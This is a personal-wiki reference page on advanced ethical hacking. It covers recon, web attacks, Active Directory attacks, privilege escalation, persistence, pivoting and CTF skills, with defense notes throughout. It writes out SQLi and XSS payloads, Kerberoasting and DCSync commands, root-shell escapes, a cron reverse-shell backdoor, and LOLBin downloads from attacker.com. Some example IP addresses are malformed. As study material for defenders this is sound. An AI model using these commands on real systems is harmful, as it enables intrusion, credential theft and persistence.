---
date: 2026-04-03T11:02:05+05:30
lastmod: 2026-04-03T11:02:05+05:30

seoTitle: Ethical Hacking Advanced – Exploitation, AD Attacks & Red Team
description: "Advanced ethical hacking reference covering exploitation techniques, Active Directory attacks, post-exploitation, evasion, red team operations, and CTF methodology. For authorized security professionals only."
keywords: "ethical hacking advanced, penetration testing advanced, active directory attacks, red team, post exploitation, privilege escalation, lateral movement, evasion techniques, CTF methodology, security research, VR-Rathod, Code-Note, code note vr, vr book"
displayTitle: Ethical Hacking Advanced – Red Team & Exploitation Concepts
enableToc: true
---

> [!danger] Legal & Ethical Disclaimer
> This page is for **authorized security professionals, students, and researchers** only.
> All techniques described are for **defensive understanding** and **authorized penetration testing**.
> **Never** apply these on systems without explicit written permission.
> Unauthorized access is illegal under CFAA (US), Computer Misuse Act (UK), IT Act 2000 (India), and equivalent laws worldwide.
> Practice only on: your own lab, CTF platforms, or with signed Rules of Engagement.
> See [[Cybersecurity]] for foundational concepts.

- # Reconnaissance & Information Gathering
	- ## Passive Reconnaissance (OSINT)
	  ```mermaid
	  graph LR
	     TARGET["🎯 Target\nOrganization"]
	     DNS["DNS Enumeration\nSubdomains · MX · NS · TXT"]
	     WHOIS["WHOIS\nRegistrar · Contacts · Dates"]
	     CERT["Certificate Transparency\ncrt.sh · Censys"]
	     SHODAN["Shodan / Censys\nExposed services · Banners"]
	     GITHUB["GitHub / GitLab\nLeaked secrets · Tech stack"]
	     SOCIAL["LinkedIn / Social\nEmployees · Job titles · Tech"]
	     GOOGLE["Google Dorks\nExposed files · Login pages"]
	     TARGET --> DNS & WHOIS & CERT & SHODAN & GITHUB & SOCIAL & GOOGLE
	  ```
	- ## Google Dorking
	  ```bash title="Google Dork operators"
	  site:example.com                        # restrict to domain
	  site:example.com filetype:pdf           # PDFs on domain
	  site:example.com inurl:admin            # admin pages
	  site:example.com intitle:"index of"     # directory listings
	  site:example.com ext:sql OR ext:bak     # database/backup files
	  intext:"password" filetype:txt          # password files
	  inurl:"/wp-admin" site:example.com      # WordPress admin
	  "Powered by" "phpMyAdmin" site:example.com
	  intitle:"Dashboard" inurl:":8080"       # exposed dashboards
	  ```
	- ## DNS Enumeration
	  ```bash title="DNS enumeration techniques"
	  # Basic lookups
	  dig example.com ANY             # all records
	  dig example.com MX              # mail servers
	  dig example.com NS              # name servers
	  dig example.com TXT             # TXT records (SPF, DKIM)
	  dig -x 1.2.3.4                  # reverse DNS
	  
	  # Subdomain enumeration
	  amass enum -d example.com       # comprehensive subdomain enum
	  subfinder -d example.com        # fast passive subdomain finder
	  assetfinder example.com         # find subdomains + assets
	  dnsx -l subdomains.txt -a       # resolve list of subdomains
	  
	  # Zone transfer (misconfiguration check)
	  dig axfr example.com @ns1.example.com
	  
	  # DNS brute force
	  gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
	  ```
	- ## Active Reconnaissance
	  ```bash title="Active scanning — authorized environments only"
	  # Nmap scan progression
	  nmap -sn 900.160.1.0/24         # host discovery (ping sweep)
	  nmap -sS -T4 -p- target         # full SYN scan all ports
	  nmap -sV -sC -p 22,80,443 target # version + default scripts
	  nmap -O target                  # OS detection
	  nmap -A target                  # aggressive (all of above)
	  nmap --script=vuln target       # vulnerability scripts
	  nmap -sU --top-ports 100 target # top 100 UDP ports
	  
	  # Service-specific enumeration
	  nmap -p 445 --script smb-enum-shares,smb-enum-users target
	  nmap -p 25 --script smtp-enum-users target
	  nmap -p 3306 --script mysql-info,mysql-enum target
	  nmap -p 389 --script ldap-search target
	  ```
-
- # Web Application Security (Advanced)
	- ## SQL Injection — Advanced Techniques
	  > [!warning] For authorized testing and defensive understanding only.
	  
	  ```mermaid
	  graph TD
	     SQLi["SQL Injection Types"]
	     CL["Classic / Error-based\nError reveals DB info"]
	     UN["Union-based\nUNION SELECT to extract data"]
	     BL["Blind Boolean\nTrue/False responses"]
	     TM["Time-based Blind\nSLEEP() / WAITFOR DELAY"]
	     OB["Out-of-band\nDNS/HTTP exfiltration"]
	     SQLi --> CL & UN & BL & TM & OB
	  ```
	  
	  ```sql title="SQL Injection detection payloads (for authorized testing)"
	  -- Basic detection
	  '
	  ''
	  ' OR '1'='1
	  ' OR 1=1--
	  admin'--
	  
	  -- Union-based (find column count first)
	  ' ORDER BY 1--
	  ' ORDER BY 2--
	  ' UNION SELECT NULL--
	  ' UNION SELECT NULL,NULL--
	  
	  -- Extract database info
	  ' UNION SELECT @@version,NULL--          -- MySQL/MSSQL version
	  ' UNION SELECT version(),NULL--          -- PostgreSQL version
	  ' UNION SELECT table_name,NULL FROM information_schema.tables--
	  
	  -- Time-based blind (MySQL)
	  ' AND SLEEP(5)--
	  ' AND IF(1=1,SLEEP(5),0)--
	  ```
	-
	- ## Cross-Site Scripting (XSS) — Advanced
	  ```javascript title="XSS payload concepts (for authorized testing)"
	  // Basic detection
	  <script>alert(1)</script>
	  <img src=x onerror=alert(1)>
	  <svg onload=alert(1)>
	  "><script>alert(1)</script>
	  
	  // Context-aware payloads
	  // Inside attribute: " onmouseover="alert(1)
	  // Inside JavaScript: ';alert(1)//
	  // Inside CSS: </style><script>alert(1)</script>
	  
	  // DOM-based XSS
	  // Look for: document.write(), innerHTML, eval(), location.hash
	  
	  // Content Security Policy bypass research
	  // CSP: script-src 'nonce-xxx' → need valid nonce
	  // CSP: script-src cdn.example.com → JSONP bypass if available
	  ```
	  
	  > [!tip] XSS Defense
	  > - Output encode all user data: `htmlspecialchars()` in PHP, `escapeHtml()` in JS
	  > - Implement strict **Content Security Policy (CSP)**
	  > - Use `HttpOnly` and `Secure` flags on session cookies
	  > - Validate input server-side — never trust client data
	- ## Server-Side Request Forgery (SSRF)
	  ```bash title="SSRF concepts"
	  # SSRF allows attacker to make server fetch internal resources
	   Common targets:
	     Cloud metadata: http://169.254.169.254/latest/meta-data/
	     Internal services: http://localhost:8080/admin
	     Internal network: http://190.168.1.1/
	  
	  # AWS IMDS v1 (vulnerable to SSRF)
	  # http://169.254.169.254/latest/meta-data/iam/security-credentials/
	  
	  # Defense:
	  # - Allowlist outbound URLs
	  # - Block RFC 1918 + loopback ranges
	  # - Use IMDSv2 (requires session token header)
	  # - Validate and sanitize URL inputs
	  ```
	-
	- ## Authentication Bypass Concepts
	  ```bash title="Authentication testing concepts"
	  # JWT manipulation (for authorized testing)
	  # 1. Decode JWT: base64 decode header.payload
	  # 2. Check algorithm: alg=none attack (if server accepts)
	  # 3. Check weak secret: hashcat -m 16500 jwt.txt wordlist.txt
	  # 4. Check RS256→HS256 confusion attack
	  
	  # OAuth misconfigurations
	  # - state parameter missing (CSRF)
	  # - redirect_uri not validated
	  # - implicit flow token leakage
	  
	  # Session management issues
	  # - predictable session IDs
	  # - session fixation
	  # - missing Secure/HttpOnly flags
	  # - long session expiry
	  ```
	-
	- ## API Security Testing
	  ```bash title="API security testing concepts"
	  # Common API vulnerabilities (OWASP API Top 10):
	  # API1: Broken Object Level Authorization (BOLA/IDOR)
	  #   → Change /api/users/123 to /api/users/124
	  # API2: Broken Authentication
	  #   → Weak tokens, no rate limiting
	  # API3: Broken Object Property Level Authorization
	  #   → Mass assignment, over-exposure of fields
	  # API4: Unrestricted Resource Consumption
	  #   → No rate limiting, large payloads
	  # API5: Broken Function Level Authorization
	  #   → Access admin endpoints as regular user
	  
	  # Tools for API testing
	  # Burp Suite → intercept + modify API calls
	  # Postman → API client with test scripts
	  # ffuf → fuzz API endpoints
	  ffuf -u https://api.example.com/FUZZ -w endpoints.txt
	  ```
-
- # Active Directory Attacks (Defensive Understanding)
	- ## AD Architecture Overview
	  ```mermaid
	  graph TD
	     FOREST["🌲 Forest\nTop-level AD container"]
	     DOMAIN["🏛️ Domain\nexample.local"]
	     DC["Domain Controller\nKerberos KDC · LDAP · DNS\nAD Database (NTDS.dit)"]
	     OU["Organizational Units\nUsers · Computers · Groups"]
	     GPO["Group Policy Objects\nSecurity settings · Scripts"]
	     TRUST["Domain Trusts\nOne-way / Two-way / Transitive"]
	     FOREST --> DOMAIN --> DC
	     DOMAIN --> OU
	     DOMAIN --> GPO
	     FOREST --> TRUST
	  ```
	- ## Kerberos Authentication Flow
	  ```mermaid
	  sequenceDiagram
	     participant U as 👤 User
	     participant DC as 🏛️ DC (KDC)
	     participant SRV as 🖥️ Service
	     Note over U,DC: Step 1 — Get TGT
	     U->>DC: AS-REQ (username + encrypted timestamp)
	     DC->>U: AS-REP (TGT encrypted with krbtgt hash)
	     Note over U,DC: Step 2 — Get Service Ticket
	     U->>DC: TGS-REQ (TGT + requested service SPN)
	     DC->>U: TGS-REP (Service Ticket encrypted with service account hash)
	     Note over U,SRV: Step 3 — Access Service
	     U->>SRV: AP-REQ (Service Ticket)
	     SRV->>U: AP-REP (access granted)
	  ```
	- ## AD Enumeration (Authorized Testing)
	  ```bash title="AD enumeration — authorized environments only"
	  # BloodHound — AD attack path analysis
	  # Collector (run on domain-joined machine):
	  SharpHound.exe -c All             # Windows collector
	  bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All  # Linux
	  
	  # BloodHound queries (in GUI):
	  # "Find all Domain Admins"
	  # "Shortest Paths to Domain Admins"
	  # "Find Principals with DCSync Rights"
	  
	  # LDAP enumeration
	  ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" -D "user@domain.local" -w password
	  ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
	  
	  # PowerView (PowerShell — authorized testing)
	  Get-NetDomain                     # domain info
	  Get-NetDomainController           # domain controllers
	  Get-NetUser                       # all users
	  Get-NetGroup "Domain Admins"      # group members
	  Get-NetComputer                   # all computers
	  Find-LocalAdminAccess             # where current user is local admin
	  ```
	- ## Kerberoasting (Concept & Defense)
	  > [!warning] Kerberoasting — Concept for Defenders
	  > Attackers request Kerberos service tickets for accounts with SPNs, then crack them offline.
	  > The ticket is encrypted with the **service account's password hash**.
	  
	  ```bash title="Kerberoasting — authorized testing concept"
	  # Request service tickets (authorized testing)
	  GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
	  # Outputs hashes in hashcat format
	  
	  # Crack offline (authorized testing)
	  hashcat -m 13100 hashes.txt wordlist.txt
	  
	  # Defense:
	  # - Use long (25+) random passwords for service accounts
	  # - Use Group Managed Service Accounts (gMSA) — auto-rotate passwords
	  # - Monitor for TGS-REQ for multiple SPNs from single user
	  # - Enable AES encryption for Kerberos (disable RC4)
	  ```
	- ## AS-REP Roasting (Concept & Defense)
	  > [!warning] AS-REP Roasting — Concept for Defenders
	  > Accounts with "Do not require Kerberos preauthentication" can have their AS-REP captured and cracked offline.
	  
	  ```bash title="AS-REP Roasting — authorized testing concept"
	  # Find vulnerable accounts
	  GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -no-pass
	  # Crack offline
	  hashcat -m 18200 hashes.txt wordlist.txt
	  
	  # Defense:
	  # - Enable Kerberos pre-authentication on ALL accounts
	  # - Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
	  ```
	- ## Pass-the-Hash / Pass-the-Ticket (Concept & Defense)
	  > [!warning] These concepts help defenders understand what to monitor for.
	  
	  ```bash title="PtH / PtT — authorized testing concepts"
	  # Pass-the-Hash (NTLM)
	  # Attacker captures NTLM hash → uses it directly without cracking
	  # impacket-psexec -hashes :NTLM_HASH administrator@target
	  
	  # Pass-the-Ticket (Kerberos)
	  # Attacker exports Kerberos ticket → imports on another machine
	  # mimikatz: sekurlsa::tickets /export
	  # Rubeus: Rubeus.exe dump /service:krbtgt
	  
	  # Defense:
	  # - Enable Credential Guard (VBS-based LSASS protection)
	  # - Disable NTLM where possible (enforce Kerberos)
	  # - Use Protected Users security group
	  # - Monitor for: Event 4624 logon type 3 with NTLM
	  # - Implement PAM (Privileged Access Management)
	  ```
	- ## DCSync Attack (Concept & Defense)
	  > [!danger] DCSync — Critical AD Attack Concept
	  > Attacker with **Replicating Directory Changes** permission can simulate DC replication and dump ALL password hashes from AD.
	  
	  ```bash title="DCSync — authorized testing concept"
	  # Requires: Replicating Directory Changes + Replicating Directory Changes All
	  # secretsdump.py domain/user:password@DC_IP -just-dc
	  # mimikatz: lsadump::dcsync /domain:domain.local /all
	  
	  # Defense:
	  # - Audit who has Replicating Directory Changes rights
	  # - Monitor Event ID 4662 (object access with replication GUIDs)
	  # - Use Microsoft ATA / Defender for Identity to detect DCSync
	  # - Restrict domain replication permissions to DCs only
	  ```
	- ## Golden & Silver Tickets (Concept & Defense)
	  > [!danger] Golden Ticket — Persistence Concept
	  > Attacker with **krbtgt hash** can forge any Kerberos TGT — full domain persistence.
	  
	  ```bash title="Golden/Silver Ticket — authorized testing concepts"
	  # Golden Ticket: forge TGT using krbtgt hash
	  # Requires: krbtgt NTLM hash + domain SID
	  # Valid for 10 years by default
	  # mimikatz: kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-... /krbtgt:HASH
	  
	  # Silver Ticket: forge service ticket for specific service
	  # Requires: service account hash + domain SID
	  # More stealthy — doesn't touch DC
	  
	  # Defense:
	  # - Reset krbtgt password TWICE (invalidates all tickets)
	  # - Monitor for tickets with unusual lifetimes
	  # - Enable PAC validation
	  # - Use Microsoft Defender for Identity
	  ```
-
- # Privilege Escalation
	- ## Linux Privilege Escalation
	  ```mermaid
	  graph TD
	     LOW["Low Privilege Shell\nwww-data / user"]
	     ENUM["Enumeration\nLinPEAS · Manual checks"]
	     SUID["SUID Binaries\nGTFOBins"]
	     SUDO["Sudo Misconfig\nsudo -l"]
	     CRON["Cron Jobs\nWritable scripts"]
	     KERN["Kernel Exploits\nDirtyPipe · DirtyCow"]
	     CAPS["Capabilities\ngetcap -r /"]
	     PATH["PATH Hijacking\nWritable PATH dirs"]
	     ROOT["🔴 Root"]
	     LOW --> ENUM
	     ENUM --> SUID & SUDO & CRON & KERN & CAPS & PATH
	     SUID & SUDO & CRON & KERN & CAPS & PATH --> ROOT
	  ```
	  
	  ```bash title="Linux PrivEsc enumeration"
	  # Automated enumeration
	  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
	  
	  # Manual checks
	  id && whoami                    # current user + groups
	  sudo -l                         # sudo permissions
	  find / -perm -u=s -type f 2>/dev/null   # SUID binaries
	  find / -perm -g=s -type f 2>/dev/null   # SGID binaries
	  getcap -r / 2>/dev/null         # capabilities
	  cat /etc/crontab                # system cron jobs
	  ls -la /etc/cron.d/ /var/spool/cron/
	  find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
	  cat /etc/passwd | grep -v nologin | grep -v false  # login users
	  uname -a                        # kernel version → searchsploit
	  cat /etc/issue && cat /etc/*release  # OS version
	  env                             # environment variables
	  history                         # command history
	  find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
	  ```
	- ## Windows Privilege Escalation
	  ```bash title="Windows PrivEsc enumeration (from authorized shell)"
	  # Automated
	  # WinPEAS: https://github.com/carlospolop/PEASS-ng/releases
	  .\winPEASx64.exe
	  
	  # Manual checks
	  whoami /priv                    # current privileges
	  whoami /groups                  # group memberships
	  net user                        # local users
	  net localgroup administrators   # admin group members
	  systeminfo                      # OS + patch level
	  wmic qfe list brief             # installed patches
	  
	  # Service misconfigurations
	  sc query                        # list services
	  wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
	  # Unquoted service paths with spaces = potential hijack
	  
	  # Registry autoruns
	  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	  reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	  
	  # AlwaysInstallElevated (MSI as SYSTEM)
	  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	  
	  # Stored credentials
	  cmdkey /list
	  ```
	- ## GTFOBins — SUID/Sudo Abuse Reference
	  > [!info] GTFOBins
	  > [gtfobins.github.io](https://gtfobins.github.io) — reference for Unix binaries that can be abused for privilege escalation.
	  > If a binary is in `sudo -l` or has SUID bit, check GTFOBins for escalation paths.
	  
	  ```bash title="Common GTFOBins examples (authorized testing)"
	  # vim with sudo
	  sudo vim -c ':!/bin/bash'
	  
	  # find with SUID
	  ./find . -exec /bin/bash -p \; -quit
	  
	  # python with sudo
	  sudo python3 -c 'import os; os.system("/bin/bash")'
	  
	  # nmap (older versions) with sudo
	  echo "os.execute('/bin/bash')" > /tmp/shell.nse
	  sudo nmap --script=/tmp/shell.nse
	  ```
-
- # Post-Exploitation & Lateral Movement
  collapsed:: true
	- ## Post-Exploitation Goals
	  ```mermaid
	  graph LR
	     INIT["Initial Access\nLow-priv shell"]
	     PRIV["Privilege Escalation\nLocal admin / root"]
	     PERS["Persistence\nSurvive reboot"]
	     ENUM["Internal Enumeration\nNetwork · Users · Data"]
	     LAT["Lateral Movement\nOther systems"]
	     EXFIL["Data Collection\n& Exfiltration"]
	     INIT --> PRIV --> PERS
	     PRIV --> ENUM --> LAT --> EXFIL
	  ```
	- ## Persistence Mechanisms (Concept & Defense)
	  > [!warning] Understanding persistence helps defenders detect and remove it.
	  
	  ```bash title="Linux persistence concepts"
	  # Cron backdoor
	  # (crontab -l; echo "* * * * * bash -i >& /dev/tcp/IP/PORT 0>&1") | crontab -
	  # Defense: monitor crontab changes, audit /etc/cron*
	  
	  # SSH authorized_keys
	  # echo "attacker_pubkey" >> ~/.ssh/authorized_keys
	  # Defense: monitor ~/.ssh/authorized_keys, use file integrity monitoring
	  
	  # Systemd service
	  # Create malicious .service file in /etc/systemd/system/
	  # Defense: monitor new service creation, audit systemd units
	  
	  # SUID shell
	  # cp /bin/bash /tmp/.hidden && chmod u+s /tmp/.hidden
	  # Defense: AIDE file integrity, monitor SUID changes
	  ```
	  
	  ```powershell title="Windows persistence concepts"
	  # Registry Run keys
	  # HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	  # Defense: monitor registry run keys, use autoruns tool
	  
	  # Scheduled tasks
	  # schtasks /create /tn "Task" /tr "payload.exe" /sc onlogon
	  # Defense: monitor Event ID 4698 (task created)
	  
	  # Services
	  # sc create "ServiceName" binpath= "payload.exe"
	  # Defense: monitor Event ID 7045 (new service)
	  
	  # WMI subscriptions (stealthy)
	  # Defense: Get-WMIObject -Namespace root\subscription -Class __EventFilter
	  ```
	- ## Lateral Movement Techniques (Concept & Defense)
	  ```bash title="Lateral movement — authorized testing concepts"
	  # Pass-the-Hash (NTLM)
	  # impacket-psexec -hashes :NTLM_HASH admin@target
	  # Defense: Credential Guard, disable NTLM, monitor Event 4624 type 3
	  
	  # WMI execution
	  # impacket-wmiexec domain/user:password@target
	  # Defense: monitor WMI activity, restrict WMI access
	  
	  # SMB execution
	  # impacket-smbexec domain/user:password@target
	  # Defense: restrict SMB, monitor Event 4624/4648
	  
	  # RDP
	  # xfreerdp /u:user /p:password /v:target
	  # Defense: restrict RDP, enable NLA, monitor Event 4624 type 10
	  
	  # SSH (Linux)
	  # ssh -i stolen_key user@target
	  # Defense: monitor SSH logins, use bastion hosts
	  ```
	- ## Pivoting & Tunneling
	  ```bash title="Network pivoting — authorized testing concepts"
	  # SSH dynamic SOCKS proxy
	  ssh -D 1080 user@pivot_host
	  # Configure proxychains: socks5 127.0.0.1 1080
	  proxychains nmap -sT -Pn 192.168.2.0/24
	  
	  # SSH local port forward
	  ssh -L 8080:internal_host:80 user@pivot_host
	  # Now access internal_host:80 via localhost:8080
	  
	  # Chisel (HTTP tunnel — no SSH needed)
	  # Attacker: chisel server -p 8000 --reverse
	  # Victim:   chisel client attacker:8000 R:1080:socks
	  
	  # Ligolo-ng (modern pivoting tool)
	  # More efficient than proxychains for large networks
	  ```
-
- # Evasion & Defense Bypass (Concepts)
  collapsed:: true
	- ## Antivirus Evasion Concepts
	  > [!info] Understanding AV evasion helps defenders improve detection.
	  
	  ```mermaid
	  graph LR
	     AV["Antivirus Detection Methods"]
	     SIG["Signature-based\nHash / byte pattern matching"]
	     HEUR["Heuristic\nSuspicious behavior patterns"]
	     SAND["Sandboxing\nRun in isolated environment"]
	     ML["Machine Learning\nAnomaly detection"]
	     AV --> SIG & HEUR & SAND & ML
	  ```
		- | Evasion Concept | Description | Defender Response |
		  |----------------|-------------|------------------|
		  | Encoding/Obfuscation | Change payload bytes to avoid signature | Behavioral detection, AMSI |
		  | Packing | Compress/encrypt payload, unpack at runtime | Memory scanning, unpacking |
		  | Fileless | Run entirely in memory (PowerShell, WMI) | AMSI, memory scanning, EDR |
		  | Living off the Land | Use built-in OS tools (LOLBins) | Monitor LOLBin usage, UEBA |
		  | Process Injection | Inject code into legitimate process | EDR process monitoring |
		  | Timestomping | Modify file timestamps | File integrity monitoring |
	- ## AMSI (Antimalware Scan Interface)
	  > [!info] AMSI — Windows security feature
	  > AMSI allows security products to scan scripts (PowerShell, VBScript, JScript) before execution.
	  > Understanding AMSI helps defenders ensure it's properly configured.
	  
	  ```powershell title="AMSI concepts"
	  # AMSI scans PowerShell, VBScript, JScript, .NET before execution
	  # Enabled by default in Windows 10+
	  # EDR products hook AMSI for additional scanning
	  
	  # Check AMSI status
	  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
	  
	  # Defense: ensure AMSI is not disabled
	  # Monitor for AMSI bypass attempts in logs
	  # Use EDR that integrates with AMSI
	  ```
	- ## LOLBins (Living Off the Land Binaries)
	  > [!warning] LOLBins — Defenders must monitor these
	  > Attackers use legitimate OS binaries to avoid detection.
	  > Reference: [lolbas-project.github.io](https://lolbas-project.github.io) (Windows) | [gtfobins.github.io](https://gtfobins.github.io) (Linux)
	  
	  ```powershell title="Common LOLBins — monitor these in your environment"
	  # certutil — download files
	  certutil -urlcache -split -f http://attacker.com/file.exe file.exe
	  
	  # bitsadmin — download files
	  bitsadmin /transfer job http://attacker.com/file.exe C:\file.exe
	  
	  # mshta — execute HTA files
	  mshta http://attacker.com/payload.hta
	  
	  # regsvr32 — execute DLL/SCT
	  regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
	  
	  # wscript/cscript — execute scripts
	  wscript payload.vbs
	  
	  # Defense: monitor these with EDR, use application whitelisting
	  ```
-
- # CTF Methodology & Skills
  collapsed:: true
	- ## CTF Categories
	  ```mermaid
	  graph LR
	     CTF["🚩 CTF Categories"]
	     WEB["Web\nSQLi · XSS · SSRF\nAuth bypass · IDOR"]
	     PWN["Pwn / Binary Exploitation\nBuffer overflow · ROP\nFormat string · Heap"]
	     REV["Reverse Engineering\nGhidra · IDA · radare2\nCrackmes"]
	     CRYPTO["Cryptography\nRSA · AES · Hash\nCustom ciphers"]
	     MISC["Misc / Forensics\nSteganography · PCAP\nMemory forensics"]
	     OSINT["OSINT\nGoogle dorking\nSocial media"]
	     CTF --> WEB & PWN & REV & CRYPTO & MISC & OSINT
	  ```
	- ## Binary Exploitation Concepts
	  > [!info] Binary exploitation is a core CTF and security research skill.
	  
	  ```mermaid
	  graph TD
	     STACK["Stack Layout\n(high address → low address)"]
	     ARGS["Function Arguments"]
	     RET["Return Address\n← overwrite this for control flow"]
	     SBP["Saved Base Pointer"]
	     LOCALS["Local Variables\n← overflow starts here"]
	     BUF["Buffer\n[AAAA...AAAA]"]
	     STACK --> ARGS --> RET --> SBP --> LOCALS --> BUF
	  ```
	  
	  ```bash title="Binary exploitation concepts"
	  # Check binary protections
	  checksec --file=./binary
	  # NX: No-Execute (stack not executable)
	  # PIE: Position Independent Executable (ASLR for binary)
	  # Stack Canary: random value before return address
	  # RELRO: Relocation Read-Only (GOT protection)
	  
	  # Buffer overflow concept:
	  # 1. Find buffer size (fuzzing or source code)
	  # 2. Find offset to return address (pattern_create / cyclic)
	  # 3. Control EIP/RIP
	  # 4. Redirect to shellcode or ROP chain
	  
	  # ROP (Return-Oriented Programming)
	  # Chain existing code "gadgets" to bypass NX
	  ROPgadget --binary ./binary --rop
	  ropper -f ./binary
	  
	  # Format string vulnerability
	  # printf(user_input) → %x %x %x leaks stack
	  # %n writes to memory
	  ```
	- ## Cryptography CTF Concepts
	  ```python title="Common crypto CTF patterns"
	  # RSA with small exponent (e=3)
	  # If m^3 < n, then c = m^3 (no modular reduction)
	  # Solution: cube root of c
	  
	  # RSA common modulus attack
	  # Two ciphertexts with same n but different e
	  # Extended Euclidean algorithm to recover plaintext
	  
	  # Frequency analysis (classical ciphers)
	  from collections import Counter
	  freq = Counter(ciphertext.lower())
	  # Most common letter in English: e, t, a, o, i, n
	  
	  # XOR cipher
	  # key = plaintext XOR ciphertext
	  # If key repeats: Kasiski test, index of coincidence
	  
	  # Hash length extension attack
	  # SHA-1/SHA-256/MD5 with secret prefix
	  # hashpump tool
	  ```
	- ## Forensics & Steganography CTF
	  ```bash title="Forensics CTF toolkit"
	  # File analysis
	  file suspicious_file             # identify file type
	  strings suspicious_file          # extract strings
	  xxd suspicious_file | head -20   # hex dump
	  binwalk suspicious_file          # find embedded files
	  binwalk -e suspicious_file       # extract embedded files
	  foremost -i suspicious_file      # recover by file header
	  
	  # Image steganography
	  steghide info image.jpg          # check for hidden data
	  steghide extract -sf image.jpg   # extract (needs password)
	  stegseek image.jpg wordlist.txt  # crack steghide password
	  zsteg image.png                  # LSB steganography in PNG
	  exiftool image.jpg               # metadata analysis
	  
	  # Network forensics (PCAP)
	  wireshark capture.pcap           # GUI analysis
	  tshark -r capture.pcap -Y "http" # filter HTTP
	  tshark -r capture.pcap -T fields -e http.request.uri  # extract URIs
	  strings capture.pcap | grep -i "flag\|CTF\|password"
	  
	  # Memory forensics
	  volatility -f memory.dmp imageinfo          # identify profile
	  volatility -f memory.dmp --profile=Win10x64 pslist  # process list
	  volatility -f memory.dmp --profile=Win10x64 netscan  # network connections
	  volatility -f memory.dmp --profile=Win10x64 filescan  # files in memory
	  volatility -f memory.dmp --profile=Win10x64 dumpfiles -Q 0xADDR -D ./  # dump file
	  ```
-
- # More Learn
	- ## Github & Webs
		- [HackTheBox](https://www.hackthebox.com) — realistic machines
		- [TryHackMe](https://tryhackme.com) — guided learning
		- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free web labs
		- [HackTricks](https://book.hacktricks.xyz) — pentest cheatsheet
		- [GTFOBins](https://gtfobins.github.io) — Unix binary abuse
		- [LOLBAS](https://lolbas-project.github.io) — Windows LOLBins
		- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
		- [PEASS-ng (LinPEAS/WinPEAS)](https://github.com/carlospolop/PEASS-ng)
		- [SecLists](https://github.com/danielmiessler/SecLists) — wordlists
		- [Impacket](https://github.com/fortra/impacket) — Windows protocol tools
		- [[Cybersecurity]] — foundational concepts
		- [[Kali Linux]] — security tools reference
		- [[Linux Advanced]] — Linux internals
		- [[Cybersecurity Architecture]] — enterprise security design
	- ## Master Playlists YouTube
		- [TCM Security – Practical Ethical Hacking](https://www.youtube.com/results?search_query=tcm+security+practical+ethical+hacking)
		- [IppSec – HackTheBox Walkthroughs](https://www.youtube.com/@ippsec)
		- [John Hammond – CTF Walkthroughs](https://www.youtube.com/@JohnHammond)
		- [LiveOverflow – Binary Exploitation](https://www.youtube.com/@LiveOverflow)